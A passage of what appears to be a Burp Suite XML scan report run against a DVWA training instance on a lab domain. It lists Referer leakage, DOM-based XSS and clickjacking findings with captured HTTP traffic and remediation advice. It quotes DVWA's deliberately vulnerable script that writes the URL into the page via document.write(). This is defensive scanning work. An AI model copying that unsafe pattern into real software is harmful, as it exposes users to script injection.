+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /vulnerabilities/xss_r/ HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/xss_d/?default=French
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 5243
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:22:13 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='../../.'" class=""><a href="../../.">Home</a></li>
+<li onclick="window.location='../../instructions.php'" class=""><a href="../../instructions.php">Instructions</a></li>
+<li onclick="window.location='../../setup.php'" class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../vulnerabilities/brute/'" class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='../../vulnerabilities/exec/'" class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/csrf/'" class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='../../vulnerabilities/fi/.?page=include.php'" class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='../../vulnerabilities/upload/'" class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='../../vulnerabilities/captcha/'" class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli/'" class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli_blind/'" class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='../../vulnerabilities/weak_id/'" class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_d/'" class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_r/'" class="selected"><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_s/'" class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../security.php'" class=""><a href="../../security.php">DVWA Security</a></li>
+<li onclick="window.location='../../phpinfo.php'" class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='../../about.php'" class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../logout.php'" class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Vulnerability: Reflected Cross Site Scripting (XSS)</h1>
+
+	<div class="vulnerable_code_area">
+		<form name="XSS" action="#" method="GET">
+			<p>
+				What's your name?
+				<input type="text" name="name">
+				<input type="submit" value="Submit">
+			</p>
+			<input type='hidden' name='user_token' value='dbaf82f762fd54e339e4dcec12ddc15f' />
+		</form>
+		
+	</div>
+
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></li>
+		<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></li>
+		<li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank">https://en.wikipedia.org/wiki/Cross-site_scripting</a></li>
+		<li><a href="http://www.cgisecurity.com/xss-faq.html" target="_blank">http://www.cgisecurity.com/xss-faq.html</a></li>
+		<li><a href="http://www.scriptalert1.com/" target="_blank">http://www.scriptalert1.com/</a></li>
+	</ul>
+</div>
+
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_help.php?id=xss_r&security=impossible' )"> <input type="button" value="View Source" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_source.php?id=xss_r&security=impossible' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>8248355891786055680</serialNumber>
+    <type>5243904</type>
+    <name><![CDATA[Cross-domain Referer leakage]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/vulnerabilities/xss_d/]]></path>
+    <location><![CDATA[/vulnerabilities/xss_d/]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the "Referer" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>
+<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>
+<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>
+<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>
+<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.
+</p>]]></remediationBackground>
+    <references><![CDATA[<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">Referer Policy</a></li>
+</ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The page was loaded from a URL containing a query string:<ul><li>http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/xss_d/</li></ul>The response contains the following links to other domains:<ul><li>https://www.acunetix.com/blog/articles/dom-xss-explained/</li><li>https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</li><li>https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)</li></ul>]]></issueDetail>
+    <issueDetailItems>
+      <issueDetailItem><![CDATA[https://www.acunetix.com/blog/articles/dom-xss-explained/]]></issueDetailItem>
+      <issueDetailItem><![CDATA[https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)]]></issueDetailItem>
+      <issueDetailItem><![CDATA[https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)]]></issueDetailItem>
+    </issueDetailItems>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /vulnerabilities/xss_d/?default=English HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/vulnerabilities/xss_d/
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 5619
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:22:05 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='../../.'" class=""><a href="../../.">Home</a></li>
+<li onclick="window.location='../../instructions.php'" class=""><a href="../../instructions.php">Instructions</a></li>
+<li onclick="window.location='../../setup.php'" class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../vulnerabilities/brute/'" class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='../../vulnerabilities/exec/'" class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/csrf/'" class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='../../vulnerabilities/fi/.?page=include.php'" class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='../../vulnerabilities/upload/'" class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='../../vulnerabilities/captcha/'" class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli/'" class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli_blind/'" class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='../../vulnerabilities/weak_id/'" class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_d/'" class="selected"><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_r/'" class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_s/'" class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../security.php'" class=""><a href="../../security.php">DVWA Security</a></li>
+<li onclick="window.location='../../phpinfo.php'" class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='../../about.php'" class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../logout.php'" class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				<div class="body_padded">
+	<h1>Vulnerability: DOM Based Cross Site Scripting (XSS)</h1>
+
+	<div class="vulnerable_code_area">
+ 
+ 		<p>Please choose a language:</p>
+
+		<form name="XSS" method="GET">
+			<select name="default">
+				<script>
+					if (document.location.href.indexOf("default=") >= 0) {
+						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
+						document.write("<option value='" + lang + "'>" + (lang) + "</option>");
+						document.write("<option value='' disabled='disabled'>----</option>");
+					}
+					    
+					document.write("<option value='English'>English</option>");
+					document.write("<option value='French'>French</option>");
+					document.write("<option value='Spanish'>Spanish</option>");
+					document.write("<option value='German'>German</option>");
+				</script>
+			</select>
+			<input type="submit" value="Select" />
+		</form>
+	</div>
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></li>
+		<li><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)" target="_blank">https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)</a></li>
+		<li><a href="https://www.acunetix.com/blog/articles/dom-xss-explained/" target="_blank">https://www.acunetix.com/blog/articles/dom-xss-explained/</a></li>
+	</ul>
+</div>
+
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_help.php?id=xss_d&security=impossible' )"> <input type="button" value="View Source" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_source.php?id=xss_d&security=impossible' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>5979517766780984320</serialNumber>
+    <type>2097936</type>
+    <name><![CDATA[Cross-site scripting (DOM-based)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/vulnerabilities/xss_d/]]></path>
+    <location><![CDATA[/vulnerabilities/xss_d/]]></location>
+    <severity>High</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>
+<p>DOM-based cross-site scripting arises when a script  writes controllable data into the HTML document in an unsafe way. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
+<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
+<p>Users can be induced to visit the attacker's crafted URL in various ways, similar to the usual attack delivery vectors for reflected cross-site scripting vulnerabilities.</p>
+
+<p>Burp Suite automatically identifies this issue using static code analysis, which may lead to false positives that are not actually exploitable. The relevant code and execution paths should be reviewed to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based cross-site scripting vulnerabilities is not to dynamically write data from any untrusted source into the HTML document. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing script code into the document. In many cases, the relevant data can be validated on a whitelist basis, to allow only content that is known to be safe. In other cases, it will be necessary to sanitize or encode the data. This can be a complex task, and depending on the context that the data is to be inserted may need to involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence. </p>]]></remediationBackground>
+    <references><![CDATA[<ul>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting">Cross-site scripting</a></li>
+		<li><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">DOM-based cross-site scripting</a>
+	</li>
+
+</ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The application may be vulnerable to DOM-based cross-site scripting. Data is read from <b>document.location.href</b> and passed to <b>document.write()</b>.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /vulnerabilities/xss_d/ HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/setup.php
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 5619
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:22:01 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='../../.'" class=""><a href="../../.">Home</a></li>
+<li onclick="window.location='../../instructions.php'" class=""><a href="../../instructions.php">Instructions</a></li>
+<li onclick="window.location='../../setup.php'" class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../vulnerabilities/brute/'" class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='../../vulnerabilities/exec/'" class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/csrf/'" class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='../../vulnerabilities/fi/.?page=include.php'" class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='../../vulnerabilities/upload/'" class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='../../vulnerabilities/captcha/'" class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli/'" class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='../../vulnerabilities/sqli_blind/'" class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='../../vulnerabilities/weak_id/'" class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_d/'" class="selected"><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_r/'" class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='../../vulnerabilities/xss_s/'" class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../security.php'" class=""><a href="../../security.php">DVWA Security</a></li>
+<li onclick="window.location='../../phpinfo.php'" class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='../../about.php'" class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../logout.php'" class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				<div class="body_padded">
+	<h1>Vulnerability: DOM Based Cross Site Scripting (XSS)</h1>
+
+	<div class="vulnerable_code_area">
+ 
+ 		<p>Please choose a language:</p>
+
+		<form name="XSS" method="GET">
+			<select name="default">
+				<script>
+					if (document.location.href.indexOf("default=") >= 0) {
+						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
+						document.write("<option value='" + lang + "'>" + (lang) + "</option>");
+						document.write("<option value='' disabled='disabled'>----</option>");
+					}
+					    
+					document.write("<option value='English'>English</option>");
+					document.write("<option value='French'>French</option>");
+					document.write("<option value='Spanish'>Spanish</option>");
+					document.write("<option value='German'>German</option>");
+				</script>
+			</select>
+			<input type="submit" value="Select" />
+		</form>
+	</div>
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></li>
+		<li><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)" target="_blank">https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)</a></li>
+		<li><a href="https://www.acunetix.com/blog/articles/dom-xss-explained/" target="_blank">https://www.acunetix.com/blog/articles/dom-xss-explained/</a></li>
+	</ul>
+</div>
+
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_help.php?id=xss_d&security=impossible' )"> <input type="button" value="View Source" class="popup_button" onclick="javascript:popUp( '../../vulnerabilities/view_source.php?id=xss_d&security=impossible' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+    <staticAnalysis>
+      <source>document.location.href</source>
+      <sink>document.write()</sink>
+      <codeSnippets>
+        <codeSnippet>var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</codeSnippet>
+        <codeSnippet>document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + (lang) + &quot;&lt;/option&gt;&quot;);</codeSnippet>
+      </codeSnippets>
+    </staticAnalysis>
+  </issue>
+  <issue>
+    <serialNumber>2920506217446791168</serialNumber>
+    <type>5245344</type>
+    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/vulnerabilities/xss_d/]]></path>
+    <location><![CDATA[/vulnerabilities/xss_d/]]></location>
+    <severity>Information</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
+<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
+<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
+    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /vulnerabilities/xss_d/ HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/setup.php
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 5619
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:22:01 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='../../.'" class=""><a href="../../.">Home</a></li>
+<li onclick="window.location='../../instructions.php'" class=""><a href="../../instructions.php">Instructions</a></li>
+<li onclick="window.location='../../setup.php'" class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='../../vulnerabilities/brute/'" class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='../../vulnerabilities/exec/'" class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
